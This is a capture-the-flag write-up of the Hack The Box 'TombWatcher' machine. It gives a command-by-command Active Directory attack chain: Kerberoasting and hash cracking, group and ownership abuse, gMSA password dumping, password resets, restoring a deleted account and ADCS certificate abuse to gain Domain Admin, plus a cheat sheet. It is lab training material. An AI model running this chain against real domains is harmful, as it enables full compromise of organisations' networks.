# HTB TombWatcher - Writeup (magyar)

**Platform:** Windows  
**IP:** 10.10.11.72

**Difficulty:** Medium 

---

## Recon

### NMAP

```
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows AD LDAP (SSL)
3268/tcp  open  ldap          Microsoft Windows AD LDAP (GC)
3269/tcp  open  ssl/ldap      Microsoft Windows AD LDAP (GC SSL)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
9389/tcp  open  mc-nmf        .NET Message Framing
49666-49737/tcp több nyitott MSRPC port
```
### SMB + clock-skew

**Time synchronization (important!):**

```
sudo rdate -n tombwatcher.htb
```

## BloodHound, Kerberoasting, initial user chain

### BloodHound data collection

```
nxc bloodhound -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb --no-pass-pol
```
- Analyze the generated zip — you'll find a regular entry-level domain user (henry).

### Kerberoasting

```
python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
```

- Result: kerberoast hash, crackable with **hashcat**:

```
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
```

- **Result:** alfred : bas*********

---

## Group abuse, gMSA, service user

### Group membership expansion

```
bloodyAD -u 'alfred' -p 'bas*******' -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred
```

### gMSA dump

```
python3 gMSADumper.py -u 'alfred' -p 'bas******' -d 'tombwatcher.htb'
```
- Hash: ansible_dev$ : <hash>

### Password change to Sam user

```
bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u 'ansible_dev$' -p '<hash>' set password SAM 'NoSecHere!'
```

---

## WriteOwner / GenericAll abuse, John reset

### Take over with WriteOwner:

```
impacket-owneredit -action write -target 'john' -new-owner 'sam' 'tombwatcher.htb/sam':'NoSecHere!' -dc-ip 10.10.11.72
```

### GenericAll on John (using Sam):

```
bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u 'sam' -p 'NoSecHere!' add genericAll john sam
```

### Reset John user's password:

```
bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u 'sam' -p 'NoSecHere!' set password john 'NoSecHere'
```

---

## User shell & user flag

### Evil-WinRM login:

```
evil-winrm -i 10.10.11.72 -u john -p NoSecHere
```

- **User flag:** C:\Users\john\Desktop\user.txt

---

## Restoring deleted cert_admin AD object

- Searching:
```
Get-ADObject -filter {SamAccountName -eq 'cert_admin'} -IncludeDeletedObjects
```
- Restore:
```
Restore-ADObject -Identity <GUID>
```
- Enable:
```
Enable-ADAccount -Identity cert_admin
```
- Password reset:
```
Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "NoSecHere" -AsPlainText -Force)
```

---

## ADCS escalation – Domain Admin cert chain

### Sablon enum:

```
certipy-ad find -u cert_admin -p 'NoSecHere' -dc-ip 10.10.11.72 -vulnerable
```

### Admin cert acquisition (old certipy):

```
python3 entry.py req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -u cert_admin@tombwatcher.htb -p 'NoSecHere' -template WebServer -upn administrator@tombwatcher.htb -application-policies 1.3.6.1.5.5.7.3.2
```
- **UPN:** administrator@tombwatcher.htb

### Admin shell with cert (LDAP shell):

```
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72 -domain tombwatcher.htb -ldap-shell
```

- Change password for domain admin:
```
change_password administrator NoSecHere
```

---

## Root shell & root.txt

```
evil-winrm -i 10.10.11.72 -u administrator -p NoSecHere
```

- **Root flag:** C:\Users\Administrator\Desktop\root.txt

---

# Notes / Casual Observations

- After the Kerberoast chain, it was great how almost every step allowed instant group abuse
- Random issues with certipy versions – classic chain only worked after `pip install certipy==1.2.0`
- AD object recovery and enabling was a nice workflow – most CTFs don’t have this
- **ADCS UPN chain**: even a “bad” template can lead to full admin if you use the policy OID smartly!
- Before root, if you have to reboot the HTB machine, **write down every hash/password immediately!**

---

# Lessons Learned

- AD privilege chain: if you can go through group abuses after the initial foothold, almost any user can become DA
- From Kerberoast to ADCS, you can pull off the entire chain with open source tools
- pip-installed certipy, gMSADumper, bloodyAD – all are gold
- Try from multiple environments if your workflow breaks!
- On HTB machines, **the chain matters, not just individual exploits!**

---

# Cheat Sheet

## Cracking Kerberoast hash
```
hashcat -m 13100 hashfile /usr/share/wordlists/rockyou.txt
```

## Restoring AD object
```
Get-ADObject -filter {SamAccountName -eq 'cert_admin'} -IncludeDeletedObjects
Restore-ADObject -Identity <GUID>
Enable-ADAccount -Identity cert_admin
```

## Requesting admin cert with old certipy (pip version):
```
python3 entry.py req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -u cert_admin@tombwatcher.htb -p 'NoSecHere' -template WebServer -upn administrator@tombwatcher.htb -application-policies 1.3.6.1.5.5.7.3.2
```

## Evil-WinRM shell as DA
```
evil-winrm -i 10.10.11.72 -u administrator -p NoSecHere

*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/13/2025   7:13 AM             34 root.txt
```

---

## That was the TombWatcher machine! If you finished it, instant respect! 👾
